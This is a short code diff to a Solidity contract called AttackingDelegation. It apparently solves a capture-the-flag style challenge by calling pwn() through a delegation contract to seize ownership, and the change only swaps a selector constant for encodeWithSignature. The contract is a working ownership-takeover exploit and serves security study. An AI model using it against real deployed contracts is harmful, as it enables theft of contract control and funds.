@@ -2,7 +2,6 @@
 pragma solidity ^0.8.9;
 
 contract AttackingDelegation {
-    bytes4 private constant PWN_SELECTOR = bytes4(keccak256("pwn()"));
     address public delegationAddress;
 
     constructor(address _delegationAddress) {
@@ -11,7 +10,7 @@ contract AttackingDelegation {
 
     function hackContract() external {
         (bool success, ) = delegationAddress.call(
-            abi.encodeWithSelector(PWN_SELECTOR)
+            abi.encodeWithSignature("pwn()")
         );
         require(success, "Failed to take ownership");
     }
